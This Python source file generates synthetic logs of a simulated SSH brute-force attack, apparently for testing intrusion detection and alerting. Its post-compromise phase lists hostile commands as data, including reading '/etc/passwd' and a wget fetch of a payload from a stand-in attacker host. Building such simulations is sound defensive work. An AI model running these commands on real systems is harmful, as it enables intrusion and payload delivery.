"""
Brute Force Attack Log Generator
"""
import random
from typing import List, Dict, Any


class BruteForceGenerator:
    """Generates synthetic logs for brute force attack simulation"""
    
    def __init__(self):
        self.attacker_ip = "192.168.1.100"
        self.target_ip = "10.0.0.5"
        self.target_port = 22  # SSH
        self.usernames = ["admin", "root", "user", "test", "oracle"]
        self.target_user = "admin"
    
    def generate_events(self, duration_seconds: int) -> List[Dict[str, Any]]:
        """Generate attack timeline with logs"""
        events = []
        elapsed = 0
        
        # Phase 1: Initial reconnaissance (first 10 seconds)
        events.extend(self._generate_recon(elapsed))
        elapsed += 10
        
        # Phase 2: Failed login attempts (40 seconds)
        failed_events, elapsed = self._generate_failed_logins(elapsed, 40)
        events.extend(failed_events)
        
        # Phase 3: Successful login (1 second)
        events.extend(self._generate_success(elapsed))
        elapsed += 2
        
        # Phase 4: Post-login activity (remaining time)
        events.extend(self._generate_post_login(elapsed, duration_seconds - elapsed))
        
        return events
    
    def _generate_recon(self, start_time: float) -> List[Dict]:
        """Generate reconnaissance logs"""
        return [
            {
                "timestamp": start_time,
                "layer": "network",
                "type": "port_scan",
                "src_ip": self.attacker_ip,
                "dst_ip": self.target_ip,
                "dst_port": self.target_port,
                "message": f"Port scan detected from {self.attacker_ip} targeting port {self.target_port}",
                "severity": "low",
                "delay": 0
            },
            {
                "timestamp": start_time + 5,
                "layer": "network",
                "type": "connection_attempt",
                "src_ip": self.attacker_ip,
                "dst_ip": self.target_ip,
                "dst_port": self.target_port,
                "message": f"SSH connection attempt from {self.attacker_ip}",
                "severity": "info",
                "delay": 5
            }
        ]
    
    def _generate_failed_logins(self, start_time: float, duration: float) -> tuple:
        """Generate failed authentication attempts"""
        events = []
        current_time = start_time
        
        # Generate 20-30 failed attempts
        num_attempts = random.randint(20, 30)
        interval = duration / num_attempts
        
        for i in range(num_attempts):
            username = random.choice(self.usernames) if random.random() > 0.7 else self.target_user
            
            event = {
                "timestamp": current_time,
                "layer": "application",
                "type": "auth_failure",
                "src_ip": self.attacker_ip,
                "dst_ip": self.target_ip,
                "user": username,
                "message": f"Failed SSH login attempt for user '{username}' from {self.attacker_ip}",
                "severity": "medium",
                "details": {
                    "attempt_number": i + 1,
                    "auth_method": "password",
                    "service": "ssh"
                },
                "delay": interval
            }
            
            # Trigger alert after threshold
            if i == 10:  # Alert at 10th attempt
                event["trigger_alert"] = True
                event["confidence"] = 0.75
            elif i == 20:  # High confidence at 20th
                event["trigger_alert"] = True
                event["confidence"] = 0.92
                event["severity"] = "high"
            
            events.append(event)
            current_time += interval
        
        return events, current_time
    
    def _generate_success(self, start_time: float) -> List[Dict]:
        """Generate successful login"""
        return [
            {
                "timestamp": start_time,
                "layer": "application",
                "type": "auth_success",
                "src_ip": self.attacker_ip,
                "dst_ip": self.target_ip,
                "user": self.target_user,
                "message": f"Successful SSH login for '{self.target_user}' from {self.attacker_ip} after multiple failures",
                "severity": "critical",
                "trigger_alert": True,
                "confidence": 0.98,
                "details": {
                    "failed_attempts_before": 25,
                    "auth_method": "password",
                    "service": "ssh"
                },
                "delay": 0.5
            }
        ]
    
    def _generate_post_login(self, start_time: float, duration: float) -> List[Dict]:
        """Generate post-compromise activity"""
        events = []
        commands = [
            "whoami",
            "uname -a",
            "cat /etc/passwd",
            "ls -la /home",
            "wget http://evil.com/payload.sh"
        ]
        
        for i, cmd in enumerate(commands):
            events.append({
                "timestamp": start_time + i * 2,
                "layer": "endpoint",
                "type": "command_execution",
                "src_ip": self.target_ip,
                "user": self.target_user,
                "message": f"Command executed: {cmd}",
                "severity": "high",
                "details": {
                    "command": cmd,
                    "parent_process": "sshd",
                    "session_id": "compromised_session"
                },
                "delay": 2
            })
        
        return events
